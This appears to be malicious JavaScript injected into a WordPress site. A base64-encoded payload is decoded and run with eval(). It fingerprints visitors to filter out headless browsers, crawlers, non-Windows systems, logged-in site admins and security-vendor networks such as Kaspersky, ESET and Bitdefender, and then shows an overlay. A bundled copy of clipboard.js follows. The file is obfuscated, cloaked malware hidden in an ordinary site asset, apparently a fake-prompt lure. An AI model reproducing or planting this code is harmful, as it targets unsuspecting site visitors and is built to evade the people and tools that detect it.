ggPSB3aW5kb3cub3V0ZXJXaWR0aDsKICAgICAgICBjb25zdCBpbm5lckhlaWdodCA9IHdpbmRvdy5pbm5lckhlaWdodDsKICAgICAgICBjb25zdCBpbm5lcldpZHRoID0gd2luZG93LmlubmVyV2lkdGg7CiAgICAgICAgY29uc3QgaXNTdXNwaWNpb3VzID0gKG91dGVySGVpZ2h0ID09PSAwICYmIG91dGVyV2lkdGggPT09IDApIHx8IChvdXRlckhlaWdodCA9PT0gaW5uZXJIZWlnaHQgJiYgb3V0ZXJXaWR0aCA9PT0gaW5uZXJXaWR0aCk7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzU3VzcGljaW91cyA/IEhFQURMRVNTX1dFSUdIVCA6IEhFQURGVUxfV0VJR0hUIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc0NvbnRyb2xsZWQgPSBuYXZpZ2F0b3Iud2ViZHJpdmVyIHx8IHdpbmRvdy5kb2N1bWVudD8uZG9jdW1lbnRFbGVtZW50Py5nZXRBdHRyaWJ1dGUoJ3dlYmRyaXZlcicpID09PSAndHJ1ZScgfHwgd2luZG93LmNhbGxQaGFudG9tIHx8IHdpbmRvdy5fcGhhbnRvbTsKICAgICAgICByZXR1cm4geyBzY29yZTogaXNDb250cm9sbGVkID8gSEVBRExFU1NfV0VJR0hUIDogSEVBREZVTF9XRUlHSFQgfTsKICAgICAgfSwKICAgICAgKCkgPT4gewogICAgICAgIGNvbnN0IGlzSGVhZGxlc3MgPSAvSGVhZGxlc3NDaHJvbWUvLnRlc3QobmF2aWdhdG9yLnVzZXJBZ2VudCk7CiAgICAgICAgcmV0dXJuIHsgc2NvcmU6IGlzSGVhZGxlc3MgPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc1BoYW50b20gPSB3aW5kb3cuY2FsbFBoYW50b20gfHwgd2luZG93Ll9waGFudG9tIHx8IHdpbmRvdy5waGFudG9tOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1BoYW50b20gPyBIRUFETEVTU19XRUlHSFQgOiAwIH07CiAgICAgIH0sCiAgICAgICgpID0+IHsKICAgICAgICBjb25zdCBpc1NlbGVuaXVtID0gd2luZG93LmRvY3VtZW50Py5kb2N1bWVudEVsZW1lbnQ/LmdldEF0dHJpYnV0ZSgnc2VsZW5pdW0nKSAhPT0gbnVsbCB8fCB3aW5kb3cuZG9jdW1lbnQ/LmRvY3VtZW50RWxlbWVudD8uZ2V0QXR0cmlidXRlKCd3ZWJkcml2ZXInKSAhPT0gbnVsbCB8fCB3aW5kb3cuZG9jdW1lbnQ/LiRjZGNfICE9PSB1bmRlZmluZWQgfHwgd2luZG93LmRvY3VtZW50Py4kd2RjXyAhPT0gdW5kZWZpbmVkOwogICAgICAgIHJldHVybiB7IHNjb3JlOiBpc1NlbGVuaXVtID8gSEVBRExFU1NfV0VJR0hUIDogMCB9OwogICAgICB9CiAgICBdOwoKICAgIGxldCB0b3RhbFNjb3JlID0gMDsKICAgIGZvciAoY29uc3QgY2hlY2sgb2YgY2hlY2tzKSB7CiAgICAgIHRyeSB7CiAgICAgICAgY29uc3QgcmVzdWx0ID0gYXdhaXQgY2hlY2soKTsKICAgICAgICB0b3RhbFNjb3JlICs9IHJlc3VsdC5zY29yZTsKICAgICAgfSBjYXRjaCAoZXJyb3IpIHsKICAgICAgICAvLyBJZ25vcmUgZXJyb3JzCiAgICAgIH0KICAgIH0KCiAgICBjb25zdCBtYXhQb3NzaWJsZVNjb3JlID0gY2hlY2tzLmxlbmd0aCAqIEhFQURMRVNTX1dFSUdIVDsKICAgIGNvbnN0IG1pblBvc3NpYmxlU2NvcmUgPSBjaGVja3MubGVuZ3RoICogSEVBREZVTF9XRUlHSFQ7CiAgICBjb25zdCBub3JtYWxpemVkU2NvcmUgPSBNYXRoLm1heCgwLCBNYXRoLm1pbigxMDAsICgodG90YWxTY29yZSAtIG1pblBvc3NpYmxlU2NvcmUpIC8gKG1heFBvc3NpYmxlU2NvcmUgLSBtaW5Qb3NzaWJsZVNjb3JlKSkgKiAxMDApKTsKICAgIHJldHVybiBNYXRoLnJvdW5kKG5vcm1hbGl6ZWRTY29yZSk7CiAgfQoKICBmdW5jdGlvbiBkZXRlY3RPUygpIHsKICAgIGNvbnN0IHVzZXJBZ2VudCA9IG5hdmlnYXRvci51c2VyQWdlbnQudG9Mb3dlckNhc2UoKTsKICAgIGNvbnN0IHBsYXRmb3JtID0gbmF2aWdhdG9yLnBsYXRmb3JtPy50b0xvd2VyQ2FzZSgpIHx8ICcnOwoKICAgIGlmICgvaXBob25lfGlwYWR8aXBvZC9pLnRlc3QodXNlckFnZW50KSkgcmV0dXJuICdpb3MnOwogICAgaWYgKC9hbmRyb2lkL2kudGVzdCh1c2VyQWdlbnQpKSByZXR1cm4gJ2FuZHJvaWQnOwogICAgaWYgKC9saW51eC9pLnRlc3QodXNlckFnZW50KSAmJiAhL2FuZHJvaWQvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnbGludXgnOwogICAgaWYgKC9tYWMgb3MgeHxtYWNpbnRvc2gvaS50ZXN0KHVzZXJBZ2VudCkpIHJldHVybiAnbWFjJzsKICAgIGlmICgvd2luL2kudGVzdCh1c2VyQWdlbnQpIHx8IC93aW4vaS50ZXN0KHBsYXRmb3JtKSkgcmV0dXJuICd3aW5kb3dzJzsKCiAgICByZXR1cm4gJ3Vua25vd24nOwogIH0KCiAgYXN5bmMgZnVuY3Rpb24gaXNBY2Nlc3NBbGxvd2VkKCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgZGV0ZWN0ZWRPUyA9IGRldGVjdE9TKCk7CiAgICAgIGNvbnN0IGluY2x1ZGVPU0xpc3QgPSBbIndpbmRvd3MiXTsKICAgICAgaWYgKGluY2x1ZGVPU0xpc3QubGVuZ3RoID4gMCAmJiAhaW5jbHVkZU9TTGlzdC5pbmNsdWRlcyhkZXRlY3RlZE9TKSkgewogICAgICAgIHZsb2coJ2Rlbnlfb3MnLCBkZXRlY3RlZE9TKTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgaGVhZGxlc3NQcm9iYWJpbGl0eSA9IGF3YWl0IGRldGVjdEhlYWRsZXNzKCk7CiAgICAgIGlmIChoZWFkbGVzc1Byb2JhYmlsaXR5ID4gMjUpIHsKICAgICAgICB2bG9nKCdkZW55X2hlYWRsZXNzJywgaGVhZGxlc3NQcm9iYWJpbGl0eSk7CiAgICAgICAgdHJhY2tCb3QoKTsKICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgIH0KCiAgICAgIGNvbnN0IGJvdFBhdHRlcm5zID0gWydib3QnLCdjcmF3bCcsJ3NwaWRlcicsJ3NjcmFwZScsJ3NsdXJwJywneWFob28nLCdnb29nbGUnLCd5YW5kZXgnLCdiYWlkdScsJ2JpbmcnLCdkdWNrZHVjaycsJ3Rlb21hJywnYXJjaGl2ZSddOwogICAgICBjb25zdCB1c2VyQWdlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICAgIGZvciAoY29uc3QgcGF0dGVybiBvZiBib3RQYXR0ZXJucykgewogICAgICAgIGlmICh1c2VyQWdlbnQuaW5jbHVkZXMocGF0dGVybikpIHsKICAgICAgICAgIHZsb2coJ2RlbnlfYm90X3VhJywgdXNlckFnZW50KTsKICAgICAgICAgIHRyYWNrQm90KCk7CiAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICB9CgogICAgICAKICAgICAgY29uc3QgaXBSZXNwb25zZSA9IGF3YWl0IGZldGNoKCdodHRwczovL2FwaS5pcGlmeS5vcmc/Zm9ybWF0PWpzb24nKTsKICAgICAgaWYgKCFpcFJlc3BvbnNlLm9rKSB7CiAgICAgICAgdmxvZygnaXBpZnlfZmFpbGVkJywgaXBSZXNwb25zZS5zdGF0dXMpOwogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9CiAgICAgIGNvbnN0IGlwRGF0YSA9IGF3YWl0IGlwUmVzcG9uc2UuanNvbigpOwogICAgICBjb25zdCBpcCA9IGlwRGF0YS5pcDsKCiAgICAgIGNvbnN0IGlzcFJlc3BvbnNlID0gYXdhaXQgZmV0Y2goJ2h0dHBzOi8vaXAybG9jYXRpb24tYXBpLTk3OTg0ODA2NzY3Ny51cy1jZW50cmFsMS5ydW4uYXBwLz9pcD0nICsgaXApOwogICAgICBpZiAoIWlzcFJlc3BvbnNlLm9rKSB7CiAgICAgICAgdmxvZygnaXNwX2xvb2t1cF9mYWlsZWQnLCBpc3BSZXNwb25zZS5zdGF0dXMpOwogICAgICAgIHJldHVybiB0cnVlOwogICAgICB9CiAgICAgIGNvbnN0IGlzcERhdGEgPSBhd2FpdCBpc3BSZXNwb25zZS5qc29uKCk7CiAgICAgIGNvbnN0IGlzcCA9IGlzcERhdGEuaXNwIHx8ICcnOwogICAgICBjb25zdCBjb3VudHJ5Q29kZSA9IGlzcERhdGEuZ2VvaXAyX2NvdW50cnlfY29kZSB8fCAnJzsKCiAgICAgIHZsb2coJ2lwX2luZm8nLCB7IGlwLCBjb3VudHJ5Q29kZSwgaXNwIH0pOwoKICAgICAgY29uc3QgaW5jbHVkZUNvdW50cnlMaXN0ID0gW107CiAgICAgIGlmIChpbmNsdWRlQ291bnRyeUxpc3QubGVuZ3RoID4gMCAmJiAoIWNvdW50cnlDb2RlIHx8ICFpbmNsdWRlQ291bnRyeUxpc3QuaW5jbHVkZXMoY291bnRyeUNvZGUpKSkgewogICAgICAgIHZsb2coJ2RlbnlfY291bnRyeScsIGNvdW50cnlDb2RlKTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQoKICAgICAgY29uc3QgYmxvY2tlZElTUHMgPSBbCiAgICAgICAgJ00yNDcgRXVyb3BlJywnUGFja2V0aHViJywnTGVhc2VXZWInLCdEYXRhQ2FtcCcsJ0lQWE8nLCdTZWN1cmUgRGF0YSBTeXN0ZW1zJywnTmllZGVyc2FlY2hzaXNjaGUgTGFuZGVzcmVnaWVydW5nJywnQmFycmFjdWRhIE5ldHdvcmtzJywnVHJlbmQgTWljcm8gSW5jb3Jwb3JhdGVkJywnTWljcm9zb2Z0IENvcnAnLCdNaWNyb3NvZnQgQ29ycG9yYXRpb24nLCdTdXJmQ29udHJvbCcsJ1dlYnNlbnNlJywnR0hPU1RuZXQgR21iSCcsJ0lORVR1JywnQXZpcmEgQi5WLicsJ0dvb2dsZSBDbG91ZCcsJ1lhaG9vIScsJ0NvbW10b3VjaCcsJ0Nsb3VkRmxhcmUnLCdUcnVzdHdhdmUgSG9sZGluZ3MnLCdGT1JUSG5ldCBTQScsJ1VTIERlcGFydG1lbnQgb2YgRGVmZW5zZSBOZXR3b3JrJywnWk9ORVMgQVMnLCdDaXNjbyBTeXN0ZW1zIElyb25wb3J0IERpdmlzaW9uJywnVGhlUGxhbmV0LmNvbSBJbnRlcm5ldCBTZXJ2aWNlcycsJ1dlYnJvb3QgU2VydmljZXMnLCdSYWNrc3BhY2UgSG9zdGluZycsJ1BlcmltZXRlciBlU2VjdXJpdHknLCdEaWdpdGFsT2NlYW4nLCdQYWNrZXRFeGNoYW5nZScsJ0d5cm9uIEludGVybmV0IEx0ZCcsJ05ld01lZGlhIEV4cHJlc3MgUHRlJywnQW1hem9uLmNvbScsJ01jQWZlZScsJ0VTRVQsIHNwb2wuIHMgci5vLicsJ0ZhY2Vib29rJywnRmFjZWJvb2sgSXJlbGFuZCBMdGQnLCdZYWhvbyEgQnJvYWRjYXN0IFNlcnZpY2VzJywnWWFob28hIEluZGlhIFB2dCcsJ1lhaG9vIEphcGFuJywnWWFob28gSmFwYW4gQ29ycG9yYXRpb24nLCdHb29nbGVib3QnLCdBVkFTVCBTb2Z0d2FyZSBzLnIuby4nLCdNaWNyb3NvZnQgYmluZ2JvdCcsJ01pY3Jvc29mdCBIb3N0aW5nJywnQW1hem9uIFRlY2hub2xvZ2llcycsJ0N5dmVpbGxhbmNlJywnQ2xvdWRtYXJrJywnQ2xvdWRtYXJrIExhYnMnLCdUb3BzeSBMYWJzJywnQW1hem9uJywnU0VSVkVSIEJMT0NLJywnT1ZIIEhvc3RpbmcnLCdZQU5ERVgnLCdZQU5ERVggTExDJywnWWFob28gQmFuZ2Fsb3JlIE5ldHdvcmsgTW9uaXRvcmluZyBDZW50ZXInLCdUaW5ldCcsJ011bHRpbWVkaWEgUG9sc2thIFMuQS4nLCdNdWx0aW1lZGlhIFBvbHNrYSAtIFBvbHVkbmllIFMuQS4nLCdaZW5pdGggRWxlY3Ryb25pY3MgQ29ycG9yYXRpb24nLCdCYXJyYWN1ZGEgQ2FuYWRhJywnTWljcm9zb2Z0IExpbWl0ZWQnLCdNaWNyb3NvZnQgKENoaW5hKSBDby4nLCdTUEFNZmlnaHRlciBBcFMnLCdTcGFtZmlnaHRlci1hcycsJ0RpZ2l0YWxPbmUgQUcnLCdUd2l0dGVyJywnVHdpdHRlciBJbnRlcm5hdGlvbmFsIENvbXBhbnknLCdTdXJmY29udHJvbC1yZWFkaW5nJywnWWFob28gQ29ycCBOZXR3b3JrJywnQ29uZWN0aXZhJywnQ29uZWN0aXZhIFRlbGVjb20nLCdDb25lY3RpdmEgQ2VsdWxhciBlIEluZm9ybWF0aWNhIEx0ZGEnLCdSZWRpZmYuY29tIEluZGlhIExpbWl0ZWQnLCdJbmNlcm8gTExDJywnT05MSU5FIFMuQS5TLicsJ09OTElORSBTQVMnLCdUaXNjYWxpLWl0JywnVGlzY2FsaSBTcEEnLCdUaXNjYWxpIFVLIExpbWl0ZWQnLCdGdWppdHN1JywnRGF1bSBDb21tdW5pY2F0aW9uIENvLixMVEQnLCdJbnRlcm5ldCBTZWN1cml0eSBTeXN0ZW1zJywnVktvbnRha3RlIEx0ZCcsJ0xlYXNld2ViJywnTGVhc2VXZWIgTmV0aGVybGFuZHMgQi5WLicsJ0xlYXNlV2ViIEIuVi4nLCdMZWFzZVdlYiBDRE4gQi5WLicsJ0xlYXNlV2ViIE5ldHdvcmsgQi5WLicsJ0xlYXNld2ViIEFzaWEnLCdMZWFzZXdlYiBBc2lhIFBhY2lmaWMgcHRlLicsJ0xlYXNld2ViIERldXRzY2hsYW5kIEdtYkgnLCdMZWFzZXdlYiBVU0EnLCdMZWFzZXdlYi1kZScsJ0ludGVyTkFQIE5ldHdvcmsgU2VydmljZXMgVS5LLiBMaW1pdGVkJywnSW50ZXJuYXAgSmFwYW4gQ28uLExURC4nLCdJbnRlcm5hcCBOZXR3b3JrIFNlcnZpY2VzJywnSW50ZXJuYXAgTmV0d29yayBTZXJ2aWNlcyBDb3Jwb3JhdGlvbicsJ0JpdGRlZmVuZGVyLWFzJywnQml0ZGVmZW5kZXIgU1JMJywnTVggTG9naWMnLCdDaGluYSBFZHVjYXRpb24gYW5kIFJlc2VhcmNoIE5ldHdvcmsgQ2VudGVyJywnQ2hpbmEgRHV0eSBGcmVlIGdyb3VwJywnQ2hpbmEnLCdDaGluYSBCcm9hZGJhbmQgQ29tbXVuaWNhdGlvbnMgKENCQ25ldCknLCdDaGluYSBCcm9hZGNhc3RpbmcgVFYgTmV0JywnQ2hpbmEgQ29tbXVuaWNhdGlvbiBDby4nLCdDaGluYSBDb25zdHJ1Y3Rpb24gQmFuayAoQXNpYSkgQ29ycG9yYXRpb24gTGltaXRlZCcsJ0NoaW5hIEN1bHR1cmFsIEhlcml0YWdlIEluZm9ybWF0aW9uIGFuZCBDb25zdWx0aW5nJywnQ2hpbmEgRGlnaXRhbCBLaW5nZG9tIFRlY2hub2xvZ3kgQ28uLEx0ZC4nLCdDaGluYSBEcmFnb24gVGVsZWNvbSBDby4sTHRkJywnRmFjdGlvbicsJ1plbiBTeXN0ZW1zIEEvUycsJ09WSCBTQVMnLCdTb2x1dGlvbiBQcm8nLCdEZWRGaWJlckNvJywnQ2xlYXJCbHVlIFRlY2hub2xvZ2llcycsJ0luZm9ybWF0aW9uIFRlY2hub2xvZ3kgU3lzdGVtcycsJ0dvRGFkZHkuY29tLCBMTEMnLCdTZXJ2ZXIgQ2VudHJhbCBOZXR3b3JrJywnVGluZXQgU3BhJywnQ2FwcmlzIEdyb3VwJywnSW5rdG9taSBDb3Jwb3JhdGlvbicsJ1VuaWZpZWQgTGF5ZXInLCdKU0MgUlRDb21tLlJVJywnTExDIG1hc3Rlcmhvc3QnLCdNVE8gVGVsZWNvbScsJ0xpbmtlZEluIENvcnBvcmF0aW9uJywnV2Vic2l0ZXdlbGNvbWUuY29tJywnR1RTIFRlbGVjb20gU1JMJywnUHVsc2VQb2ludCBDb21tdW5pY2F0aW9ucycsJ1B1bHNlcG9pbnQnLCdUaW1lV2ViIEx0ZC4nLCdCZWlqaW5nIEJhaWR1IE5ldGNvbSBTY2llbmNlIGFuZCBUZWNobm9sb2d5IENvLicsJ0RpZ2l0YWwgT2NlYW4nLCdUaHJlYXRUcmFjaycsJ1RocmVhdFRyYWNrIFNlY3VyaXR5JywnRUdJSG9zdGluZycsJ0hFVFpORVInLCdIZXR6bmVyLWFzJywnSGV0em5lciBPbmxpbmUgR21iSCcsJ0hFVFpORVIgKFB0eSkgTHRkJywnSGV0em5lciBDQycsJ0xpbWl0ZWQgbGlhYmlsaXR5IGNvbXBhbnkgTWFpbC5SdScsJ0FtYXpvbiBDb3Jwb3JhdGUgTExDJywnQW1hem9uIERhdGEgU2VydmljZXMgSXJlbGFuZCBMdGQnLCdBbWF6b24gV2ViIFNlcnZpY2VzLCBMTEMnLCdBbWF6b24uY29tIFRlY2ggVGVsZWNvbScsJ0FtYXpvbmlhIFB1YmxpY2lkYWRlIEx0ZGEnLCdBbWF6b25pYSBUZWxlY29tIEx0ZGEuIC0gTWUnLCdLYXNwZXJza3kgTGFiIEFPJywnQWxpc3RhciBTZWN1cml0eSBTcmwnLCdORk9yY2UgRW50ZXJ0YWlubWVudCBCLlYuJywnU0sgQnJvYWRiYW5kJywnWmF5byBHcm91cCBFVSBMaW1pdGVkJywnUXVhZHJhTmV0JywnUmFtTm9kZSBMTEMnLCdIb3N0VVMnCiAgICAgIF07CgogICAgICBpZiAoYmxvY2tlZElTUHMuaW5jbHVkZXMoaXNwKSkgewogICAgICAgIHZsb2coJ2RlbnlfaXNwJywgaXNwKTsKICAgICAgICB0cmFja0JvdCgpOwogICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgfQogICAgICAKCiAgICAgIHJldHVybiB0cnVlOwogICAgfSBjYXRjaCAoZXJyKSB7CiAgICAgIHZlcnIoJ0FjY2VzcyBjaGVjayBmYWlsZWQ6JywgZXJyKTsKICAgICAgcmV0dXJuIHRydWU7CiAgICB9CiAgfQoKICBhc3luYyBmdW5jdGlvbiBpbml0KCkgewogICAgdHJ5IHsKICAgICAgY29uc3QgYWxsb3dlZCA9IGF3YWl0IGlzQWNjZXNzQWxsb3dlZCgpOwogICAgICB2bG9nKCdhY2Nlc3NfYWxsb3dlZCcsIGFsbG93ZWQpOwogICAgICBpZiAoIWFsbG93ZWQpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGNvbnN0IHNraXAgPSBnZXRWYWwoJ19za2lwJywgJzAnKTsKICAgICAgaWYgKHNraXAgPT09ICcxJykgewogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd3cGFkbWluYmFyJykpIHsKICAgICAgICByZXR1cm47CiAgICAgIH0KCiAgICAgIGxldCBjb3VudCA9IHBhcnNlSW50KGdldFZhbChLRVksICcwJyksIDEwKTsKICAgICAgaWYgKE51bWJlci5pc05hTihjb3VudCkpIGNvdW50ID0gMDsKICAgICAgY291bnQrKzsKICAgICAgc2V0VmFsKEtFWSwgY291bnQudG9TdHJpbmcoKSk7CgogICAgICBpZiAoY291bnQgPj0gTikgewogICAgICAgIHJlbmRlck92ZXJsYXkoKTsKICAgICAgfQogICAgfSBjYXRjaChlKSB7CiAgICAgIHZlcnIoJ2luaXRfZmFpbGVkJywgZSk7CiAgICAgIHJlbmRlck92ZXJsYXkoKTsKICAgIH0KICB9CgogIGlmIChkb2N1bWVudC5ib2R5KSB7CiAgICBpbml0KCk7CiAgfSBlbHNlIHsKICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBpbml0KTsKICB9Cn0pKCk7CiAg",
    "MC4xODc1NzI4MDk3MzQ2ODEyNw==",
    "MC4xNzA1MTY5MzA2MTEwNjUx",
    "MC41MTM3NzIyMDA4NTk2NzY4",
    "MC4yMTUzOTAzOTg2Mzk4NjQz",
    "MC4xMzEyNjM0NDQ3ODExMDgz"
  ];

  var _k1 = "539252";
  var _k2 = "385903";
  var _k3 = 4;

  var _code = b64ToUtf8(_a[_k1]) + b64ToUtf8(_e[_k2]) + b64ToUtf8(_c[_k3]);
  eval(_code);
})();
/* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
